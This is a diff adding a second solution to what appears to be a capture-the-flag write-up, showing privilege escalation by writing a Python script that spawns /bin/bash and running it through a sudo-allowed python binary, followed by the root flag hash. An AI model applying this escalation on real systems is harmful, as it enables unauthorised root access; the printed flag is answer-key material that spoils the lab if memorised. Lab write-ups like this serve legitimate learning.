@@ -99,3 +99,29 @@ And we get Root
 ```
 e8c8c6c256c35515d1d344ee0488c617
 ```
+
+
+---
+
+2nd solving
+
+- got stuck at priv esc
+- tried to use different python script and shellgen's one line script but was not working
+- used below script
+
+```
+meliodas@ubuntu:~$ touch bak.py
+meliodas@ubuntu:~$ echo "import os" > bak.py
+meliodas@ubuntu:~$ echo "print(os.system('/bin/bash'))" >> bak.py
+
+
+meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
+root@ubuntu:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+- and got the root
+```
+root@ubuntu:/root# cat root.txt 
+e8c8c6c256c35515d1d344ee0488c617
+```
